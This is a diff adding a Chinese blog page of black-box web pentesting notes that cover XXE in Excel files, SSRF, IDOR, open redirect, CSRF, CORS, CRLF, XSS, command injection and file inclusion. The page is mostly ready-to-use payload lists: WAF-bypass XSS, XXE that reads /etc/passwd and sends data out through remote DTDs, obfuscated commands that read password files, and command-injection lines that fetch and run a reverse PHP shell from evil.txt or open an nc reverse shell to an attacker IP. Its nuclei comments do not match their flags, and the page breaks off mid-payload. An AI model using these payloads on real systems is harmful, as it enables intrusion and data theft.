@@ -1,0 +1,2219 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>黑盒知识梳理 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>黑盒知识梳理</h1>
+    <div class="meta"><span class="chip date">2024-12-12</span><span class="chip">分类·靶场</span><span class="chip">#靶场</span></div>
+    <article><h2>xxe-- hacking wite excel变种版</h2>
+<p>现在excel本质上就是一个包含xml文档的压缩文件，和docx,ppt一样，这就可以被称之为OOxml,即
+office open xml</p>
+<p>所以这有什么问题呢，就是说当我们要在某个地方允许上传这种ooxml的时候，如果没有安全配置器，那么这个存在xxe是必然的</p>
+<pre><code class="language-Actionscript">┌──(kali㉿kali)-[~/Desktop]
+└─$ mkdir xml &amp;&amp; cd xml
+
+┌──(kali㉿kali)-[~/Desktop/xml]
+└─$ unzip ../0.xlsx
+Archive:  ../0.xlsx
+  inflating: [Content_Types].xml
+  inflating: _rels/.rels
+  inflating: docProps/app.xml
+ extracting: [trash]/0000.dat
+  inflating: xl/_rels/workbook.xml.rels
+  inflating: xl/styles.xml
+  inflating: xl/theme/theme1.xml
+  inflating: xl/workbook.xml
+  inflating: xl/worksheets/sheet1.xml
+  inflating: docProps/core.xml
+</code></pre>
+<p>创建一个崭新的excel，虽然你可能在里面键入一些文本，但这是无关紧要的，</p>
+<p>要使用的攻击文件也会因为所使用的库而有所不同。大部分解析工作通常是从<code>xl/workbook.xml</code>开始的，这个文件包含了所有的工作表的信息，包括工作表的名称和位置。</p>
+<p>各种工作表也可以在<code>xl/worksheets</code>目录下找到，这里的文件包含了工作表的内容，这些内容是以xml格式存储的。</p>
+<p>所以我认为可以在这个文件中下功夫</p>
+<p>--2025-1-7补充</p>
+<pre><code>其实后面我看了看别人的，不一定非要在workbook.xml,解压后的[Content_Types].xml也是可以下手
+</code></pre>
+<p>看了看佬的</p>
+<pre><code class="language-Actionscript">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &quot;dnslog的地址或者说你监听的地址/&quot;&gt; ]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<p>然后压缩为xslx上传</p>
+<p>可以看看这篇
+<a href="https://cn-sec.com/archives/248520.html">xxe-excel</a></p>
+<h2>ssrf-in-pdf</h2>
+<p>如果你访问的某个网站存在下列功能之一，那就可能存在ssrf了</p>
+<pre><code class="language-Actionscript">打印pdf报告
+生成报告文件
+提交数字签名
+····
+</code></pre>
+<p>因为都会生成pdf形式的文件，而里面的pdf解析器/js会获取其中数据并将其添加到网页页面中，</p>
+<p><a href="https://cn-sec.com/archives/2953070.html">在 PDF HTML注入中利用SSRF</a></p>
+<p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">PDF解析器html/XSS 实现SSRF</a></p>
+<h2>IDOR</h2>
+<p>简单来说就是比如</p>
+<pre><code class="language-Actionscript">https://insecure-website.com/customer_account?customer_number=132355
+</code></pre>
+<p>这个后面的132355就是idor，我们只需要更改后面的customer_number就可以绕过访问控制查看其它客户的记录</p>
+<h2>payload</h2>
+<h3>xss</h3>
+<pre><code class="language-cloudflare"> &lt;svg onload=alert&amp;#0000000040document.cookie)&gt;
+ &lt;svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b&gt;
+ &lt;Svg Only=1 OnLoad=confirm(atob(&quot;Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ==&quot;))&gt;
+</code></pre>
+<pre><code class="language-Cloudfront">&lt;details/open/ontoggle=confirm(&#39;XSS&#39;)&gt;
+6&#39;%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+;window/*aabb*/[&#39;al&#39;%2b&#39;ert&#39;](document./*aabb*/Location);
+&quot;&gt;%0D%0A%0D%0A&lt;x &#39;=&quot;foo&quot;&gt;&lt;x foo=&#39;&gt;&lt;img src=x onerror=javascript:alert(cloudfrontbypass)//&gt;
+</code></pre>
+<h3>xxe</h3>
+<pre><code class="language-LFI">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo (#ANY)&gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+<pre><code class="language-盲LFI，当第一个lfi不返回任何结果">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo (#ANY)&gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+<pre><code class="language-绕过访问控制（加载受限资源--PHP">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY ac SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php&quot;&gt;]&gt;
+&lt;foo&gt;&lt;result&gt;&amp;ac;&lt;/result&gt;&lt;/foo&gt;
+</code></pre>
+<pre><code class="language-ssrf">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo (#ANY)&gt;
+&lt;!ENTITY xxe SYSTEM &quot;https://www.example.com/text.txt&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+<pre><code class="language-XEE（XML">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+&lt;!ENTITY lol &quot;lol&quot;&gt;
+&lt;!ELEMENT lolz (#PCDATA)&gt;
+&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;
+&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</code></pre>
+<pre><code class="language-XEE">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+&lt;!ENTITY test SYSTEM &quot;https://example.com/entity1.xml&quot;&gt;]&gt;
+&lt;lolz&gt;&lt;lol&gt;3..2..1...&amp;test&lt;lol&gt;&lt;/lolz&gt;
+</code></pre>
+<pre><code class="language-XXE">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
+</code></pre>
+<pre><code class="language-xxe-ftp/http服务器">&lt;!DOCTYPE data [
+&lt;!ENTITY % remote SYSTEM &quot;http://publicServer.com/parameterEntity_sendftp.dtd&quot;&gt;
+%remote;
+%send;
+]&gt;
+&lt;data&gt;4&lt;/data&gt;
+
+File stored on http://publicServer.com/parameterEntity_sendftp.dtd
+
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;ftp://publicServer.com/%payload;&#39;&gt;&quot;&gt;
+%param1;
+</code></pre>
+<h3>ssrf</h3>
+<pre><code class="language-下面几个都是代替127.0.0.1的">http://0177.1/
+
+http://127.000.000.1
+
+http://0x7f.1/
+</code></pre>
+<p>如果是其他什么地址，可以用<code>http://www.subnetmask.info/</code> 计算</p>
+<h3>伪协议</h3>
+<pre><code class="language-伪协议">gopher://,
+dict://,
+php://,
+jar://,
+tftp://
+</code></pre>
+<h3>通配符</h3>
+<p>xip.io是一个提供通配符DNS解析的服务，它将域名中的IP地址部分解析为实际的IP地址</p>
+<p>nip.io也是</p>
+<pre><code>10.0.0.1.xip.io
+www.10.0.0.1.xip.io
+mysite.10.0.0.1.xip.io
+foo.bar.10.0.0.1.xip.io
+</code></pre>
+<pre><code>10.0.0.1.nip.io
+app.10.0.0.1.nip.io
+customer1.app.10.0.0.1.nip.io
+customer2.app.10.0.0.1.nip.io
+otherapp.10.0.0.1.nip.io
+</code></pre>
+<h3>AWS EC2 元数据（一种信息泄露</h3>
+<pre><code>http://x.x.x.x/latest/meta-data/
+http://x.x.x.x/latest/user-data/local-hostname
+http://x.x.x.x/latest/user-data/public-hostname
+</code></pre>
+<h3>LFI</h3>
+<pre><code class="language-过滤器旁路">../\
+
+..\/
+
+/..
+
+\/..
+
+/%5c..
+</code></pre>
+<h3>rce</h3>
+<p>Werkzeug 调试器</p>
+<pre><code class="language-找到可以提供用户输入的地方，提交以下字符串以导致错误">
+strіng
+</code></pre>
+<pre><code class="language-基本旁路">i&#39;&#39;&#39;d
+i&quot;&quot;&quot;d
+
+\l\s -l\a\h
+
+cat /e?c/p?ss??
+cat /e??/??ss*
+
+{ls,}
+{ls,-a}
+
+壳震漏洞
+() { :;}; echo vulnerable
+curl -H &quot;User-Agent: () { :; }; /bin/eject&quot; http://example.com/
+</code></pre>
+<h3>打开重定向</h3>
+<pre><code>/%09/google.com
+
+
+/%5cgoogle.com
+
+
+//www.google.com/%2f%2e%2e
+
+
+//www.google.com/%2e%2e
+
+
+//google.com/
+
+
+//google.com/%2f..
+
+
+//\google.com
+
+/\victim.com:80%40google.com
+</code></pre>
+<pre><code class="language-可能的开放重定向参数">?url=http://{target}
+
+
+?url=https://{target}
+
+
+?next=http://{target}
+
+
+?next=https://{target}
+
+
+?url=https://{target}
+
+
+?url=http://{target}
+
+
+?url=//{target}
+
+
+?url=$2f%2f{target}
+
+
+?next=//{target}
+
+
+?next=$2f%2f{target}
+
+
+?url=//{target}
+
+
+?url=$2f%2f{target}
+
+
+?url=//{target}
+
+
+/redirect/{target}
+
+
+/cgi-bin/redirect.cgi?{target}
+
+
+/out/{target}
+
+
+/out?{target}
+
+
+/out?/{target}
+
+
+/out?//{target}
+
+
+/out?/\{target}
+
+
+/out?///{target}
+
+
+?view={target}
+
+
+?view=/{target}
+
+
+?view=//{target}
+
+
+?view=/\{target}
+
+
+?view=///{target}
+
+
+/login?to={target}
+
+
+/login?to=/{target}
+
+
+/login?to=//{target}
+
+
+/login?to=/\{target}
+
+
+/login?to=///{target}
+</code></pre>
+<h2>nuclei 使用</h2>
+<pre><code class="language-nuclei基础使用"># 显示帮助信息
+nuclei -h
+
+# 显示 Nuclei 的当前版本
+nuclei -version
+
+# 从文件中加载目标列表
+nuclei -l targets.txt -t ~/nuclei-templates/
+
+# 指定单个目标进行测试
+nuclei -t https://example.com -t ~/nuclei-templates/
+
+# 以静默模式运行 Nuclei（抑制输出）
+nuclei -u https://example.com -t ~/nuclei-templates/
+
+# 指定使用的并发线程数
+nuclei -silent -t https://example.com -t ~/nuclei-templates/
+
+# 跳过需要身份验证的模板
+nuclei -c 10 -t https://example.com -t ~/nuclei-templates/
+
+# 自定义 Nuclei 报告的输出格式
+nuclei -no-verify -t https://example.com -t ~/nuclei-templates/
+
+# 忽略 SSL 证书错误
+nuclei -o output.txt -t https://example.com -t ~/nuclei-templates/
+
+# 指定自定义 HTTP 头包含在请求中
+nuclei -insecure -t https://example.com -t ~/nuclei-templates/
+
+# 指定自定义用户代理字符串包含在请求中
+nuclei -headers &quot;Authorization: Bearer TOKEN&quot; -t https://example.com -t ~/nuclei-templates/
+
+nuclei -user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot; -t https://example.com -t ~/nuclei-templates/
+</code></pre>
+<h2>重定向</h2>
+<p>额，应该叫开放式重定向</p>
+<p>怎么说呢，就是让页面跳转到攻击的页面，比方说</p>
+<pre><code class="language-such">https://vulnerable-website.com/redirect?url=https://malicious-website.com
+
+
+https://vulnerable-website.com/profile?redirect_uri=https://malicious-website.com
+</code></pre>
+<p>这就是重定向</p>
+<pre><code class="language-fuzz参数">?redirect_url=
+
+ ?next=
+
+ ?continue=
+
+ ?goto=
+
+ ?return_Url=
+
+ ?destination=
+
+ ?fromURI=
+
+ ?redirect=
+
+ ?go=
+
+ ?from=
+
+ ?return=
+
+ ?rurl=
+
+ ?checkout_url=
+</code></pre>
+<p><a href="https://cloud.tencent.com/developer/article/1516344">开放式重定向</a></p>
+<pre><code class="language-可能存在重定向的参数">redirect
+
+redirect_to
+
+redirect_url
+
+redirectUrl
+
+callback
+
+toUrl
+
+fromUrl
+
+request
+
+oauth_callback
+
+url
+
+go
+
+jump
+
+jump_to
+
+target
+
+service
+
+to
+
+returnUrl
+
+goTo
+
+link
+
+linkto
+
+domain
+
+return
+
+locationUrl
+
+r_url
+</code></pre>
+<p>如果是黑盒可以考虑<a href="https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt">open-redirect</a></p>
+<p>白盒的话可以参考</p>
+<pre><code class="language-java">response.sendRedirect(request.getParameter(&quot;url&quot;));
+</code></pre>
+<pre><code class="language-php">$redirect_url = $_GET[&#39;url&#39;];
+header(&quot;Location: &quot; . $redirect_url);
+</code></pre>
+<pre><code class="language-.NET">string url = request.QueryString[&quot;url&quot;];
+Response.Redirect(url);
+</code></pre>
+<pre><code class="language-Rails">redirect_to params[:url]
+</code></pre>
+<pre><code class="language-Django">redirect_url = request.GET.get(&quot;url&quot;)HttpResponseRedirect(redirect_url)
+</code></pre>
+<pre><code class="language-Flask">redirect\_url = request.form\[&#39;url&#39;\] redirect(redirect\_url)
+</code></pre>
+<p>绕过方法的话请参考这篇<a href="https://www.cnblogs.com/gorillalee/p/14351069.html">URL重定向漏洞解析
+</a>,师傅写的很详细了</p>
+<h2>csrf</h2>
+<p>有点像，木偶戏？简单来说就是你在一个已经进行过身份认证的人的浏览器（也不只是有浏览器），执行某些攻击者不必要的操作</p>
+<h3>csrf攻击类型</h3>
+<ol>
+<li><p>基于GET请求的CSRF攻击</p>
+<p> 恶意请求通过GET类型发送，通常是镶嵌在连接或者图片链接中</p>
+</li>
+<li><p>基于POST请求的CSRF攻击</p>
+<p> 恶意请求通过POST类型发送，通常是镶嵌在表单或者js代码中</p>
+</li>
+</ol>
+<p>一个POST的攻击载荷</p>
+<pre><code class="language-实例">&lt;img src=&quot;https://vulnerable-website.com/transfer?amount=1000&amp;recipient=attacker&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;
+&lt;form action=&quot;https://vulnerable-website.com/change-email&quot; method=&quot;POST&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;attacker@email.com&quot;&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Click me!&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<blockquote>
+<p>Cookie 只是一个保存在本地浏览器中的 4KB 文件，用于存储用户独有的信息，如偏好设置、会话 ID 和购物车中的商品，然后服务器会检索这些信息.</p>
+</blockquote>
+<h2>cors跨源资源共享</h2>
+<p>CORS:全称跨域资源共享（Cross-Origin Resource Sharing）</p>
+<h3>漏洞原理</h3>
+<p>cors可分为两类：简单请求和非简单请求</p>
+<p>简单请求：请求方法是<code>GET、HEAD、POST</code>中的一种，且HTTP头信息不超出以下几种字段：<code>Accept、Accept-Language、Content-Language、Last-Event-ID、Content-Type</code></p>
+<p>非简单请求：请求方法是<code>PUT、DELETE、CONNECT、OPTIONS、TRACE、PATCH，或者Content-Type字段</code>的值不是<code>application/x-www-form-urlencoded、multipart/form-data、text/plain</code></p>
+<p>当浏览器发现服务器的请求为简单请求时，会在头信息里加入Origin字段。Origin字段代表此次请求来自哪个域，服务器就可以检验是否来自该域。如果匹配，服务器就会在响应里增添三个字段：</p>
+<pre><code>Access-Control-Allow-Origin
+Access-Control-Allow-Credentials
+Access-Control-Expose-Headers
+</code></pre>
+<p>其中 <code>Access-Control-Allow-Origin</code>是必须有的，<code>Access-Control-Allow-Origin</code>字段代表允许哪个域访问。当字段值为<code>*</code>时，就代表任意域都可以访问，这样，就导致了Cors漏洞的产生</p>
+<p><a href="https://pic1.imgdb.cn/item/677f1ecad0e0a243d4f24e76.png"><img src="https://pic1.imgdb.cn/item/677f1ecad0e0a243d4f24e76.png" alt="item.filename"></a></p>
+<p>上面是我访问bili的,他明确规定了<code>Access-Control-Allow-Origin</code>为<code>https://www.bilibili.com</code></p>
+<h2>crlf</h2>
+<p>CRLF注入是一种利用应用程序中的CRLF（回车换行）字符来执行恶意操作的攻击。</p>
+<p>CRLF实际上是由CR和LF两个字符拼接而成，他们分别表示<code>回车(&quot;\r&quot;)</code>/<code>换行(&quot;\n&quot;)</code>,十六进制表示为<code>0x0d</code>和<code>0x0a</code>
+ASCII表示为<code>13/10</code></p>
+<p>像是这样，我的想法是注入一下<code>Set-Cookie:crlf=true</code>,所以我在里面<code>%0d%0aSet-Cookie:crlf=true</code>，这样如果成了的话就可以在响应头里看到<code>Set-Cookie:crlf=true</code></p>
+<p><img src="https://pic1.imgdb.cn/item/67809dd0d0e0a243d4f2ec14.png" alt=""></p>
+<p>但是这个并没有成功，o(╥﹏╥)o</p>
+<p>这玩意看着没什么危害，但是试想一下，如果我在后面添一个xss，像是这样</p>
+<pre><code class="language-payload">%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;0
+</code></pre>
+<p>这样的话，如果有人访问这个页面，就会弹出xss</p>
+<pre><code class="language-载荷"> 🔹 /%%0a0aSet-Cooke:crlf
+ 🔹 /%0aSet-Cooke:crlf
+ 🔹 /%0d%0aSet-Cooke:crlf
+ 🔹 /%0dSet-Cooke:crlf
+ 🔹 /%23%0aSet-Cooke:crlf
+ 🔹 /%23%0d%0aSet-Cooke:crlf
+ 🔹 /%23%0dSet-Cooke:crlf
+ 🔹 /%25%30%61Set-Cooke:crlf
+ 🔹 /%25%30aSet-Cooke:crlf
+ 🔹 /%250aSet-Cooke:crlf
+ 🔹 /%25250aSet-Cooke:crlf
+ 🔹 /%2e%2e%2f%0d%0aSet-Cooke:crlf
+ 🔹 /%2f%2e%2e%0d%0aSet-Cooke:crlf
+ 🔹 /%2F%0d%0aSet-Cooke:crlf
+ 🔹 /%3f%0d%0aSet-Cooke:crlf
+ 🔹 /%3f%0dSet-Cooke:crlf
+ 🔹 /%u000aSet-Cooke:crlf
+ 🔹 /%E5%98%8D%E5%98%8ASet-Cooke:crlf
+</code></pre>
+<h2>xss</h2>
+<p>三种XSS</p>
+<ol>
+<li><p>反射型XSS
+工作原理：恶意脚本从网站服务器反射回用户。这种情况通常发生在用户输入未经过适当消毒或编码就包含在响应中的情况下。</p>
+<pre><code> ○ 示例：搜索栏在结果页面显示搜索查询时未对特殊字符进行编码。攻击者可在搜索查询中注入脚本，然后在受害者查看结果时在其浏览器中执行该脚本。
+</code></pre>
+</li>
+<li><p>存储型XSS
+工作原理：恶意脚本存储在网站服务器上，每次加载受影响页面时都会执行。这种情况可能发生在评论区、论坛或其他存储用户生成内容的区域。</p>
+<pre><code> ○ 示例：包含脚本的博客评论。每次有人浏览该评论时，脚本就会在其浏览器中执行
+</code></pre>
+</li>
+<li><p>dom型xss
+工作原理：恶意脚本是通过修改页面的文档对象模型 (DOM) 而执行的。当用户输入被用于动态更新页面内容而未进行适当消毒时，就会发生这种情况。</p>
+<pre><code> ○ 示例：一个使用 JavaScript 根据用户输入更新 URL 的网站。攻击者可在 URL 中注入脚本，然后在 JavaScript 代码运行时执行该脚本
+</code></pre>
+</li>
+</ol>
+<pre><code class="language-有效载荷实例">&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;
+&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+javascript:alert(&#39;XSS&#39;)
+</code></pre>
+<pre><code class="language-dom型xss注意对象">document.url
+document.documentURI
+document.URLUnencoded
+document.baseURI
+document.referrer
+location
+location.href
+loaction.search
+location.hash
+location.pathname
+window.cookie
+window.referrer
+window.name
+
+element.innerHTML()
+element.outerHTML()
+eval()
+setTimeout()
+setInterval()
+documemt.write()
+document.writeln()
+</code></pre>
+<h3>绕waf的xss</h3>
+<p>CloudFlare WAF</p>
+<pre><code class="language-绕过waf的xss"> &lt;svg onload=alert&amp;#0000000040document.cookie)&gt;
+ &lt;svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b&gt;
+ &lt;Svg Only=1 OnLoad=confirm(atob(&quot;Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ==&quot;))&gt;
+</code></pre>
+<pre><code class="language-Cloudfront">&lt;details/open/ontoggle=confirm(&#39;XSS&#39;)&gt;
+6&#39;%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+;window/*aabb*/[&#39;al&#39;%2b&#39;ert&#39;](document./*aabb*/Location);
+&quot;&gt;%0D%0A%0D%0A&lt;x &#39;=&quot;foo&quot;&gt;&lt;x foo=&#39;&gt;&lt;img src=x onerror=javascript:alert(cloudfrontbypass)//&gt;
+</code></pre>
+<h2>指令注入</h2>
+<p>首先是常见的连接符</p>
+<pre><code class="language-链接符">&amp;
+;
+Newline (0x0a or \n)
+&amp;&amp;
+|
+||
+</code></pre>
+<p>试例</p>
+<pre><code class="language-时间注入">x.x.x.x||ping+-c+10+127.0.0.1||
+</code></pre>
+<pre><code class="language-重定向">x.x.x.x||whoami&gt;/var/www/images/output.txt||
+</code></pre>
+<pre><code class="language-oob">x.x.x.x||nslookup+burp.collaborator.address||
+x.x.x.x||nslookup+`whoami`.burp.collaborator.address||
+</code></pre>
+<h3>常见参数</h3>
+<pre><code class="language-常见参数">cmd
+exec
+command
+execute
+ping
+query
+jump
+code
+reg
+do
+func
+arg
+option
+load
+process
+step
+read
+function
+req
+feature
+exe
+module
+payload
+run
+print
+</code></pre>
+<h3>常见命令</h3>
+<pre><code class="language-常见命令">whoami
+ifconfig
+ls
+uname -a
+</code></pre>
+<h3>常见命令视窗</h3>
+<pre><code class="language-常见命令视窗">whoami
+ipconfig
+dir
+ver
+</code></pre>
+<h3>抓取密码</h3>
+<pre><code class="language-抓取密码">cat /etc/passwd
+cat /e”t”c/pa”s”swd
+cat /’e’tc/pa’s’ swd
+cat /etc/pa??wd
+cat /etc/pa*wd
+cat /et’ ‘c/passw’ ‘d
+cat /et$()c/pa$()$swd
+{cat,/etc/passwd}
+cat /???/?????d
+</code></pre>
+<h3>绕过waf</h3>
+<pre><code class="language-绕过waf">vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;
+vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
+</code></pre>
+<h3>lfi-rfi 文件包含</h3>
+<p>如何识别lfi</p>
+<ol>
+<li>参数篡改：
+查找包含 page=、file=、doc= 等参数的 URL。这些通常就是漏洞所在.</li>
+<li>目录遍历：
+尝试在参数值中添加 ../ （点斜线）。这将尝试向上浏览文件系统。如果看到不同的内容或错误，你可能发现了一些问题.</li>
+<li>空字节注入：
+在文件路径末尾添加空字节 (%00)。有些系统会在空字节后停止处理，从而有可能绕过过滤器。</li>
+<li>日志文件中毒：
+如果能在日志文件中注入代码，就有可能通过 LFI 触发它。这是一种更高级的技术</li>
+</ol>
+<p>思路</p>
+<p><img src="https://pic1.imgdb.cn/item/6780bac4d0e0a243d4f2f488.png" alt=""></p>
+<p>LFI全名实际上是Load File Inclusion，即本地文件包含漏洞</p>
+<p>所以比较常见的就是<code>..\etc\passwd</code></p>
+<p>like this</p>
+<pre><code class="language-PHP">&lt;?php
+
+$file = $_GET[ &#39;page&#39; ];
+
+$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
+$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+
+?&gt;
+</code></pre>
+<p><code>$_GET[&#39;page&#39;];</code>这个就是我们可以注入的地方,页面通过提取URL查询page参数的值，
+<code>str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</code>删除了http和https
+<code>str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</code>删除了../和..&quot;</p>
+<p>所以综上，我们可以用这个`..././..././..././..././..././</p>
+<p>而RFI全名实际上是Remote File Inclusion，即远程文件包含漏洞</p>
+<p>所以一般都是带IP的恶意文件</p>
+<p>在<a href="https://www.revshells.com/">reverse shell generator</a>下载反向链接脚本，并连接</p>
+<h2>xxe --just xxe</h2>
+<p>我就说一句，在线测试工具和发包格式</p>
+<pre><code class="language-在线测试工具">http://ceye.io/
+
+http://www.dnslog.cn/
+
+https://dnslog.io/
+</code></pre>
+<pre><code class="language-发包格式">Content-Type: application/xml
+</code></pre>
+<pre><code class="language-payload">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
